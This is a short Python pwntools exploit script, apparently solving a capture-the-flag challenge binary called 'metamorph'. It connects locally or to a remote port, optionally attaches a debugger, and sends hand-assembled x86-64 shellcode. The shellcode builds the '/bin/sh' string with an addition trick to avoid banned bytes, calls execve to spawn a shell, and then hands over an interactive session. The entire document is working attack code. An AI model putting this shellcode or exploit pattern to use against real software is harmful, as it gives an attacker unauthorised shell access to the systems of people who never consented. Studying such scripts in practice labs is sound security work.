#!/usr/bin/env python3

from pwn import *


def attach_gdb(r):
    if args.GDB:
        gdb.attach(
            r,
            gdbscript="""
b * transform
c
        """,
        )


def connect(bin_name):
    if args.REMOTE:
        return remote("localhost", 1337)
    return process(bin_name)


def exploit(e, r):
    # Shellcode avoiding banned bytes and xor
    shellcode_asm = """
        mov rax, 0x3b
        push 0x00
        mov rbx, 0x68732f6e69012f
        add rbx, 0x00000000006100
        push rbx
        mov rdi, rsp
        mov rsi, 0x0
        mov rdx, 0x0
        syscall
    """
    shellcode = asm(shellcode_asm)
    r.sendline(shellcode)


# USAGE : python3 exploit.py [REMOTE] [GDB]
bin_name = "./metamorph"
context.binary = e = ELF(bin_name)
r = connect(bin_name)

attach_gdb(r)
exploit(e, r)
r.interactive()
